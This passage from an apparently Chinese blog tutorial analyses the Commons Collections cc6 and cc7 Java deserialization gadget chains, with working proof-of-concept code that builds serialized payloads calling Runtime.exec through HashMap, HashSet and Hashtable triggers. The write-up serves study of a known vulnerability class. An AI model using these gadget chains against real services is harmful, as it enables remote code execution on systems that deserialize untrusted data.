src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210517110237951.png" alt="image-20210517110237951"></p><p>假如说这时候我们再通过HashMap的readObject方法来到LazyMap的get方法这里，当再次经过这次判断的时候，因为map里已经存放了entry&lt;“123”，“123”&gt;，那么就不再会是false，导致无法进入transform方法，利用链断掉。</p><p>所以我们需要把map的内容改掉：</p><p>两种方法都行：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lazyMap.remove(<span class="number">123</span>);</span><br><span class="line">lazyMap.clear(</span><br></pre></td></tr></table></figure><p>我们可以改写一下，将lazyMap中hashmap的put之后的key去掉，这样就可以先执行，然后在反序列化时候再执行一遍：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516222948500.png" alt="image-20210516222948500"></p><h3 id="HashMap版PoC"><a href="#HashMap版PoC" class="headerlink" title="HashMap版PoC"></a>HashMap版PoC</h3><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HashMap_Exploit</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> void main(<span class="keyword">String</span>[] args) throws Exception&#123;</span><br><span class="line">        Transformer[] transformers_exec = <span class="keyword">new</span> <span class="type">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="type">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="type">InvokerTransformer</span>(<span class="string">"getMethod"</span>,<span class="keyword">new</span> <span class="type">Class</span>[]&#123;<span class="keyword">String</span>.class,Class[].class&#125;,<span class="keyword">new</span> <span class="type">Object</span>[]&#123;<span class="string">"getRuntime"</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="type">InvokerTransformer</span>(<span class="string">"invoke"</span>,<span class="keyword">new</span> <span class="type">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> <span class="type">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="type">InvokerTransformer</span>(<span class="string">"exec"</span>,<span class="keyword">new</span> <span class="type">Class</span>[]&#123;<span class="keyword">String</span>.class&#125;,<span class="keyword">new</span> <span class="type">Object</span>[]&#123;<span class="string">"open /Applications/Calculator.app"</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer chain = <span class="keyword">new</span> <span class="type">ChainedTransformer</span>(transformers_exec);</span><br><span class="line"></span><br><span class="line">        HashMap innerMap = <span class="keyword">new</span> <span class="type">HashMap</span>();</span><br><span class="line"></span><br><span class="line">        Map lazyMap = LazyMap.decorate(innerMap,chain);</span><br><span class="line">        TiedMapEntry tmap = <span class="keyword">new</span> <span class="type">TiedMapEntry</span>(lazyMap, <span class="number">123</span>);</span><br><span class="line"></span><br><span class="line">        HashMap hashMap = <span class="keyword">new</span> <span class="type">HashMap</span>();</span><br><span class="line">        hashMap.put(tmap, <span class="string">"test"</span>);</span><br><span class="line">        lazyMap.remove(<span class="string">"123"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">        ObjectOutputStream fout = <span class="keyword">new</span> <span class="type">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="type">FileOutputStream</span>(<span class="keyword">new</span> <span class="type">File</span>(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc6_HashMap.ser"</span>)));</span><br><span class="line">        fout.writeObject(hashMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//服务端读取文件，反序列化，模拟网络传输</span></span><br><span class="line">        ObjectInputStream fin = <span class="keyword">new</span> <span class="type">ObjectInputStream</span>(<span class="keyword">new</span> <span class="type">FileInputStream</span>(<span class="keyword">new</span> <span class="type">File</span>(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc6_HashMap.ser"</span>)));</span><br><span class="line">        <span class="comment">//服务端反序列化，触发漏洞</span></span><br><span class="line">        fin.readObject();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="fake-chain版PoC"><a href="#fake-chain版PoC" class="headerlink" title="fake chain版PoC"></a>fake chain版PoC</h3><p>既然现在来到了如何绕过put方法的提前执行，可以在构造LazyMap方法的时候穿进去一个空的chain，之后再利用反射将lazymap内部的<code>_itransformer</code>属性改回到真正的chain，这样就可以只最终的反序列化触发点。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">fackchain_Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Transformer[] transformers_exec = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod",new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;"getRuntime",null&#125;),</span><br><span class="line">                new InvokerTransformer("invoke",new Class[]&#123;Object.class, Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class="line">                new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"open /Applications/IINA.app"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer[] fakeTransformer = <span class="keyword">new</span> Transformer[]&#123;&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//fake chain</span></span><br><span class="line">        Transformer chain = <span class="keyword">new</span> ChainedTransformer(fakeTransformer);</span><br><span class="line"></span><br><span class="line">        HashMap innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//先构造假的chain</span></span><br><span class="line">        Map lazyMap = LazyMap.decorate(innerMap,chain);</span><br><span class="line">        TiedMapEntry tmap = <span class="keyword">new</span> TiedMapEntry(lazyMap, <span class="number">123</span>);</span><br><span class="line"></span><br><span class="line">        HashMap hashMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        hashMap.put(tmap, <span class="string">"test"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//用反射再改回真的chain</span></span><br><span class="line">        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");</span><br><span class="line">        f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        f.set(chain, transformers_exec);</span><br><span class="line">        <span class="comment">//清空由于 hashMap.put 对 LazyMap 造成的影响</span></span><br><span class="line">        lazyMap.clear();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">        ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc6_fakechain.ser"</span>)));</span><br><span class="line">        fout.writeObject(hashMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//服务端读取文件，反序列化，模拟网络传输</span></span><br><span class="line">        ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc6_fakechain.ser"</span>)));</span><br><span class="line">        <span class="comment">//服务端反序列化，触发漏洞</span></span><br><span class="line">        fin.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="HashSet版PoC"><a href="#HashSet版PoC" class="headerlink" title="HashSet版PoC"></a>HashSet版PoC</h3><p>在HashMap的hash中，k目前还是不可控的，所以还需要找哪些函数调用了hash函数，发现HashMap自己的put方法调用了：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516215129678.png" alt="image-20210516215129678"></p><p>然而这里的key还是不可控的，所以我们要找哪里调用了put方法，发现HashSet的readObject很合适：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516215400317.png" alt="image-20210516215400317"></p><p>HashSet的底层其实还是HashMap类，我们需要让HashSet的map属性为HashMap，显然可控。</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210517111854587.png" alt="image-20210517111854587"></p><h3 id="最终版本PoC-7"><a href="#最终版本PoC-7" class="headerlink" title="最终版本PoC"></a>最终版本PoC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HashSet_Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Transformer[] transformers_exec = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod",new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;"getRuntime",null&#125;),</span><br><span class="line">                new InvokerTransformer("invoke",new Class[]&#123;Object.class, Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class="line">                new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"open /Applications/IINA.app"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer chain = <span class="keyword">new</span> ChainedTransformer(transformers_exec);</span><br><span class="line"></span><br><span class="line">        HashMap innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line">        Map lazyMap = LazyMap.decorate(innerMap,chain);</span><br><span class="line">        TiedMapEntry tmap = <span class="keyword">new</span> TiedMapEntry(lazyMap, <span class="number">123</span>);</span><br><span class="line"></span><br><span class="line">        HashSet hashset = <span class="keyword">new</span> HashSet(<span class="number">1</span>);</span><br><span class="line">        hashset.add(<span class="string">"0range"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将map属性设置为我们的tmap</span></span><br><span class="line">        <span class="comment">//1.先拿到handle</span></span><br><span class="line">        Field map = Class.forName(<span class="string">"java.util.HashSet"</span>).getDeclaredField(<span class="string">"map"</span>);</span><br><span class="line">        map.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        HashMap hashset_map = (HashMap) map.get(hashset);</span><br><span class="line">        <span class="comment">//2.拿到map的table属性，里面应该存放entry</span></span><br><span class="line">        Field table = Class.forName(<span class="string">"java.util.HashMap"</span>).getDeclaredField(<span class="string">"table"</span>);</span><br><span class="line">        table.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object[] array = (Object[])table.get(hashset_map);</span><br><span class="line">        <span class="comment">//3.将第一个entry的key设置为我们的tmap</span></span><br><span class="line">        Object node = array[<span class="number">0</span>];</span><br><span class="line">        Field key = node.getClass().getDeclaredField(<span class="string">"key"</span>);</span><br><span class="line">        key.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        key.set(node,tmap);</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">        ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc6_HashSet.ser"</span>)));</span><br><span class="line">        fout.writeObject(hashset);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//服务端读取文件，反序列化，模拟网络传输</span></span><br><span class="line">        ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc6_HashSet.ser"</span>)));</span><br><span class="line">        <span class="comment">//服务端反序列化，触发漏洞</span></span><br><span class="line">        fin.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>既然中间用到了LazyMap，那么又可以复用，InstantiateTransformer和TemplatesImpl，PoC就不粘在这里了，可以去看我的<a href="https://github.com/0range228" target="_blank" rel="noopener">github</a>。</p><h2 id="cc7"><a href="#cc7" class="headerlink" title="cc7"></a>cc7</h2><p>条件：</p><ul><li><p><strong>commons-collections:3.1-3.2.1</strong></p></li><li><p><strong>jdk1.7&amp;1.8</strong></p></li></ul><h3 id="利用链寻找-6"><a href="#利用链寻找-6" class="headerlink" title="利用链寻找"></a>利用链寻找</h3><p>cc7的想法依然是寻找LazyMap.get()的触发点。</p><p>cc7的后半段和cc1的lazymap版本一样，触发点选择到了AbstractMap的equals方法来触发对LazyMap的get方法的调用：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210517121849144.png" alt="image-20210517121849144"></p><p>这里如果m是可控的，那么可以设置m为LazyMap，这样就可以触发调用链的后半部分。</p><p>这里要寻找哪里调用了equals方法，ysoserial找到了HashTable的reconstitutionPut方法：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210517122453468.png" alt="image-20210517122453468"></p><p>这里面e是参数tab的索引，如果e.key是AbstractMap，那么就可以调用AbstractMap.equals方法。</p><p>现在问题来到了，如何才能触发reconstitutionPut方法呢？</p><p>我们发现在HashTable的readObject方法里面就调用了reconstitutionPut方法：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210517122844443.png" alt="image-20210517122844443"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">     <span class="keyword">throws</span> IOException, ClassNotFoundException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    <span class="keyword">int</span> origlength = s.readInt();</span><br><span class="line">    <span class="keyword">int</span> elements = s.readInt();<span class="comment">//elements hashtable中的元素个数</span></span><br><span class="line">    ....</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (; elements &gt; <span class="number">0</span>; elements--) &#123;<span class="comment">//通过elements的长度读取键值对</span></span><br><span class="line">        K key = (K)s.readObject();</span><br><span class="line">        V value = (V)s.readObject();</span><br><span class="line">        reconstitutionPut(table, key, value);<span class="comment">//该函数会对元素进行比较</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">this</span>.table = newTable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再看reconstitutionPut方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">reconstitutionPut</span><span class="params">(Entry&lt;K,V&gt;[] tab, K key, V value)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> StreamCorruptedException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (value == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> java.io.StreamCorruptedException();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> hash = hash(key);<span class="comment">//计算key的hash</span></span><br><span class="line">    <span class="keyword">int</span> index = (hash &amp; <span class="number">0x7FFFFFFF</span>) % tab.length;<span class="comment">//通过hash确定索引</span></span><br><span class="line">    <span class="keyword">for</span> (Entry&lt;K,V&gt; e = tab[index] ; e != <span class="keyword">null</span> ; e = e.next) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> java.io.StreamCorruptedException();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果没有相同元素，创建元素到hashtable中</span></span><br><span class="line">    Entry&lt;K,V&gt; e = tab[index];</span><br><span class="line">    tab[index] = <span class="keyword">new</span> Entry&lt;&gt;(hash, key, value, e);</span><br><span class="line">    count++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在我们跟着reconstitutionPut走，reconstitutionPut方法有三个参数：</p><p>table，key，value(后面这两个是流操作，看过writeObject就知道是hashtable自己的key和value属性)</p><p>跟进去reconstitutionPut：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210517133736874.png" alt="image-20210517133736874"></p><p>我们当然希望走的是AbstractMap类的equals方法，并且保证参数key是LazyMap类型，这样就可以走上LazyMap.get这条熟悉的道路了。</p><p><strong>AbstractMap类是一个抽象类，他实现了Map接口中的equals方法。</strong></p><p><strong>HashMap是AbsrtactMap的实现类，他没有重写equals方法，所以如果是HashMap#equals方法，其实走的是AbstractMap的equals方法。</strong></p><p>也就是说，如果<code>e.key</code>是HashMap，<code>参数(key)</code>是LazyMap，是可以走得通的。</p><p>但是怎么才能走到这个判断呢，需要先保证前半部分<code>e.hash == hash</code>，其实在String.equals()方法中存在hash碰撞。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String a = <span class="string">"yy"</span>;</span><br><span class="line">String b = <span class="string">"zZ"</span>;</span><br><span class="line">a.hashcode() == b.hashcode();<span class="comment">//true</span></span><br></pre></td></tr></table></figure><p>大家不要忘了，要想走到这里，最外层还有一个<code>e!=null</code>条件。</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210517143801027.png" alt="image-20210517143801027"></p><p>tab就是table属性，table是Hashtable用来存放entry的数组，初始状态就算有长度也是null占位。</p><p>所以我们要像进入if，需要<code>e!=null</code>成立。</p><p>需要先有一个lazymap进来，将table属性赋值、还有将hash值改成自己的参数，等后续第二个进来的lazymap再触发。</p><p>第二个进来的lazymap，才会符合e不为空，将自己的hash和e.hash比较。（用yy和zZ绕过）</p><p>进入e.key.equals(key)，e.key就是第一次进来的lazymap，参数key就是第二次进来的lazymap的innermap。</p><p>还有个细节，在第二次进入后，会进入lazymap2.equals(innermap2)</p><p>equals方法属于HashMap的父类AbstractMap，对于这部分来说，</p><p>LazyMap继承了AbstractMapDecorator的map属性，是Map接口，所以当构造函数的参数是HashMap类型，自然就是LazyMap的map属性自然就是HashMap类型了。</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210517144833958.png" alt="image-20210517144833958"></p><p>但是HashMap并没有equals方法，实际上走的是父类AbstractMap#equals方法：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210517150342575.png" alt="image-20210517150342575"></p><h3 id="最终版本PoC-8"><a href="#最终版本PoC-8" class="headerlink" title="最终版本PoC"></a>最终版本PoC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HashTable_Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] fakeTransformer = <span class="keyword">new</span> Transformer[]&#123;&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers_exec = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod",new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;"getRuntime",null&#125;),</span><br><span class="line">                new InvokerTransformer("invoke",new Class[]&#123;Object.class, Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class="line">                new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"open /Applications/IINA.app"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//先用一个假的chain占位置，稍后反射改回来</span></span><br><span class="line">        <span class="comment">//这里还是为了能够避开lazymap.put提前RCE</span></span><br><span class="line">        Transformer fakeChain = <span class="keyword">new</span> ChainedTransformer(fakeTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//LazyMap实例</span></span><br><span class="line">        Map innerMap1 = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map innerMap2 = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建两个lazymap实例</span></span><br><span class="line">        Map lazyMap1 = LazyMap.decorate(innerMap1,fakeChain);</span><br><span class="line">        lazyMap1.put(<span class="string">"yy"</span>, <span class="number">1</span>);</span><br><span class="line">        Map lazyMap2 = LazyMap.decorate(innerMap2,fakeChain);</span><br><span class="line">        lazyMap2.put(<span class="string">"zZ"</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        Hashtable hashTable = <span class="keyword">new</span> Hashtable();</span><br><span class="line">        hashTable.put(lazyMap1, <span class="string">"0range"</span>);</span><br><span class="line">        hashTable.put(lazyMap2, <span class="string">"0range"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过反射设置真的 chain 数组</span></span><br><span class="line">        Field field = ChainedTransformer.class.getDeclaredField("iTransformers");</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(fakeChain, transformers_exec);</span><br><span class="line"></span><br><span class="line">        lazyMap2.remove(<span class="string">"yy"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">        ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc6_TemplatesImpl_HashTable.ser"</span>)));</span><br><span class="line">        fout.writeObject(hashTable);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//服务端读取文件，反序列化，模拟网络传输</span></span><br><span class="line">        ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc6_TemplatesImpl_HashTable.ser"</span>)));</span><br><span class="line">        <span class="comment">//服务端反序列化，触发漏洞</span></span><br><span class="line">        fin.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为什么需要remove掉第二次的lazymap？</p><p>因为Hashtable的put方法里面也调用了equals方法：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210517152132073.png" 